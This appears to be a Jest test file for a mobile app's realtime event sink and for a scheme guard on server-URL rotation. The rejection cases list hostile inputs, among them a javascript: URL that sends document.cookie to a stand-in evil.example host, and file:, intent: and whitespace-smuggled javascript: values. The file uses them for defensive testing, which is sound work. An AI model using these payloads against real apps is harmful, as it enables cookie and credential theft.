// `applyNewServerUrl` lives in realtimeControl, whose import graph pulls the whole realtime wiring
// (ky, op-sqlite, expo-file-system, notify-kit). Stub only the leaf modules with native/ESM deps so
// the function under test — and the real session store it mutates — stay REAL.
jest.mock('@core/api', () => ({ serverApi: { ping: jest.fn() } }));
jest.mock('@db/database', () => ({ getDatabase: jest.fn(), ensureDatabase: jest.fn() }));
jest.mock('@/services/clients', () => ({
  http: { buildHeaders: () => ({}), usesHeaderAuth: () => true },
  vault: { set: jest.fn(async () => {}), get: jest.fn(async () => null) },
}));
jest.mock('@/services/backgrounds/syncedBackground', () => ({ ensureSyncedBackground: jest.fn() }));
jest.mock('@/services/databaseControl', () => ({ ensureDatabase: jest.fn(async () => ({})) }));
jest.mock('@/services/syncControl', () => ({ maybeResumeSync: jest.fn() }));
jest.mock('@/services/download/autoDownloadAttachments', () => ({
  autoDownloadMessageAttachments: jest.fn(),
}));
jest.mock('@/services/reachability', () => ({ startReachabilityWatch: jest.fn() }));
jest.mock('@/services/notifications/notifeeService', () => ({
  postNotification: jest.fn(async () => {}),
  requestNotificationPermission: jest.fn(async () => {}),
  setHideNotificationPreview: jest.fn(),
}));

import type { EventSink, NormalizedEvent } from '@core/realtime';
import { useSessionStore } from '@state/sessionStore';
import { ServerUrlEventSink } from '@/services/realtime/serverUrlEventSink';
import { applyNewServerUrl } from '@/services/realtimeControl';

const { vault: mockVault } = jest.requireMock('@/services/clients') as {
  vault: { set: jest.Mock };
};

const ev = (e: unknown): NormalizedEvent => e as NormalizedEvent;

describe('ServerUrlEventSink', () => {
  it('routes a new-server URL rotation to onNewUrl and short-circuits the inner sink', async () => {
    const inner: EventSink = { onEvent: jest.fn() };
    const onNewUrl = jest.fn();
    await new ServerUrlEventSink(inner, onNewUrl).onEvent(
      ev({ type: 'new-server', url: 'https://rotated.example.com' }),
      'socket',
    );
    expect(onNewUrl).toHaveBeenCalledWith('https://rotated.example.com');
    expect(inner.onEvent).not.toHaveBeenCalled();
  });

  it('delegates every other event to the inner sink untouched', async () => {
    const inner: EventSink = { onEvent: jest.fn() };
    const onNewUrl = jest.fn();
    const event = ev({ type: 'new-message', payload: {} });
    await new ServerUrlEventSink(inner, onNewUrl).onEvent(event, 'fcm');
    expect(inner.onEvent).toHaveBeenCalledWith(event, 'fcm');
    expect(onNewUrl).not.toHaveBeenCalled();
  });

  it('propagates an inner-sink failure (does not swallow it)', async () => {
    const inner: EventSink = { onEvent: jest.fn().mockRejectedValue(new Error('db write failed')) };
    await expect(
      new ServerUrlEventSink(inner, jest.fn()).onEvent(
        ev({ type: 'new-message', payload: {} }),
        'socket',
      ),
    ).rejects.toThrow('db write failed');
  });
});

/**
 * The scheme guard on the far side of the sink's `onNewUrl` callback.
 *
 * `new-server` is attacker-reachable: it arrives over FCM/socket and re-points BOTH the persisted
 * credential and every subsequent authenticated request (the password rides in the Authorization
 * header, so the origin decides who receives it). Without the http(s) check the app would happily
 * adopt `file:` / `intent:` / a foreign origin and hand over the server password.
 */
describe('applyNewServerUrl scheme guard', () => {
  const ORIGINAL_ORIGIN = 'https://original.example.com';

  beforeEach(() => {
    // password stays null so the success path's trailing startRealtime() returns immediately.
    useSessionStore.setState({ origin: ORIGINAL_ORIGIN, password: null });
  });

  it.each(['https://rotated.example.com', 'http://192.168.1.11:1234'])(
    'adopts %s (http(s) origins are accepted and persisted)',
    async (url) => {
      await applyNewServerUrl(url);
      expect(useSessionStore.getState().origin).toBe(url);
      expect(mockVault.set).toHaveBeenCalledWith('serverAddress', url);
    },
  );

  it.each([
    'javascript:fetch("https://evil.example/"+document.cookie)',
    'file:///data/data/com.gator/files',
    'intent://evil.example/#Intent;scheme=https;end',
    'ws://evil.example',
    '//evil.example',
    'evil.example',
    'not a url at all',
    '',
  ])('rejects %p — origin unchanged and nothing persisted', async (url) => {
    await applyNewServerUrl(url);
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
    expect(mockVault.set).not.toHaveBeenCalled();
  });

  it('rejects a scheme smuggled behind leading whitespace (the value is trimmed first)', async () => {
    await applyNewServerUrl('   javascript:alert(1)   ');
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
    expect(mockVault.set).not.toHaveBeenCalled();
  });
});
